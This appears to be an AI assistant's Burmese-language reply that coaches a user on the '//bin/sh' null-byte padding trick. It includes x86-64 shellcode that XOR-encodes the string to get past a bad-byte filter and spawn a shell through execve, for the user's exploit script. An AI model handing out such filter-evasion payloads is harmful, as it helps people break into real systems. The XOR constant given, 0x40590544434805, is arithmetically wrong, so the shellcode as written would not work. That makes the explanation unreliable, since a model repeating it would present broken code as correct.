



မဟုတ်ပါဘူးအစ်ကို။ ဒီ `//bin/sh` (Slash နှစ်ချက်) သုံးတဲ့ နည်းလမ်းဟာ Bruteforce လုပ်တဲ့ နေရာတင်မကဘဲ **Exploit Python Script (သို့မဟုတ်) Shellcode ထဲမှာ တိုက်ရိုက်ရေးတဲ့ နေရာမှာပါ မဖြစ်မနေ သုံးရတဲ့ နည်းလမ်း** ဖြစ်ပါတယ်ဗျာ။

ရှင်းအောင် ပြောရရင် Python script ထဲကနေ binary ဆီကို Shellcode ပို့လိုက်တဲ့အခါ စက်ထဲမှာ 64-bit register တွေဖြစ်တဲ့ `RAX` က `8 bytes` အပြည့် လက်ခံပါတယ်။

## ❓ ဘာလို့ `/bin/sh` တစ်ချက်တည်းဆိုရင် အဆင်မပြေတာလဲ?

Linux မှာ `/bin/sh` က စာလုံးရေ (၇) လုံးပဲ ရှိပါတယ်။ (7 bytes)

ကျွန်တော်တို့က 64-bit Register (`RAX`) ထဲကို ထည့်ချင်ရင် သူက `8 bytes` ပြည့်အောင် အလိုအလျောက် **Null Byte (`0x00`)** တစ်လုံး အရှေ့မှာ လာထပ်ပေးတတ်ပါတယ်။

Plaintext

```
စာလုံးရေ (၇) လုံး:   /  b  i  n  /  s  h
Hex representation: 2f 62 69 6e 2f 73 68
8-Byte ပြည့်အောင်ဖြည့်ရင်: 00 2f 62 69 6e 2f 73 68  <-- Null Byte (0x00) ပါလာပြီ!
```

ဒါကြောင့် အစ်ကို့ရဲ့ Shellcode ထဲမှာ `mov rax, 0x68732f6e69622f` လို့ ရေးလိုက်ရင် (သို့မဟုတ်) XOR Key ရှာရင် အဲဒီ `0x00` ကြောင့် Bad byte ငြိပြီး Shellcode အလုပ်မလုပ်တော့တာ ဖြစ်ပါတယ်။

## 🛠️ `//bin/sh` (Slash နှစ်ချက်) က ဘယ်လို ကယ်တင်လဲ?

Linux OS ရဲ့ ထူးခြားချက်ကတော့ file path တွေမှာ Slash ဘယ်နှစ်ချက်ပဲ ခံခံ (ဥပမာ `///bin//////sh` လို့ ရေးရင်တောင်) သူက `/bin/sh` အတိုင်းပဲ ပုံမှန် အလုပ်လုပ်ပေးပါတယ်။

ဒါကို အခွင့်ကောင်းယူပြီး ကျွန်တော်တို့က ရှေ့မှာ `/` တစ်လုံး ထပ်တိုးလိုက်တော့ (၈) လုံး အပြည့် ဖြစ်သွားပါတယ်။

Plaintext

```
စာလုံးရေ (၈) လုံး:   /  /  b  i  n  /  s  h
Hex representation: 2f 2f 62 69 6e 2f 73 68  <-- Null Byte (0x00) လုံးဝ မပါတော့ပါ!
```

## 💻 ဒါဆို Exploit Script ထဲမှာ ဘယ်လို သုံးမလဲ?

အစ်ကို့ရဲ့ ပင်မ Exploit script ထဲမှာ Shellcode ရေးတဲ့အခါ အစောနက ရှာတွေ့ထားတဲ့ Key နဲ့ `//bin/sh` ကို တွက်ချက်ပြီး အခုလို ပြောင်းရေးရမှာ ဖြစ်ပါတယ်။

Python

```
# အစ်ကို့ရဲ့ ပင်မ Exploit Script (filtering_bypass.py) ထဲမှာ ဒီလို သုံးရပါမယ်

# 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f2f (//bin/sh ရဲ့ hex ပါ)
# ရလဒ်က 0x40590544434805 ဖြစ်သွားပါမယ်။

shellcode = '''    
mov rax, 0x2a2a2a2a2a2a2a2a
push rax
mov rax, 0x40590544434805        # //bin/sh နဲ့ XOR ထားတဲ့ တန်ဖိုးအသစ်
xor [rsp], rax
mov rdi, rsp
push 0x0
pop rsi
push 0x0
pop rdx
push 0x3a
pop rax
add al, 0x1
syscall
'''
```

## 💡 အနှစ်ချုပ်

`//bin/sh` ဆိုတာ **Padding Trick** တစ်ခုပါ။

- Bruteforce ရှာတဲ့နေရာမှာရော...
    
- မူရင်း Exploit Python script ရဲ့ Shellcode ထဲမှာပါ...
    

အဲဒီ `//` (Slash နှစ်ချက်) ပုံစံအတိုင်းတွက်ချက်ပြီး ထည့်ပေးမှသာ စက်ထဲမှာ `0x00` လုံးဝ ကင်းစင်ပြီး Filter ကို အောင်မြင်စွာ ကျော်ဖြတ်နိုင်မှာ ဖြစ်ပါတယ်ဗျာ။
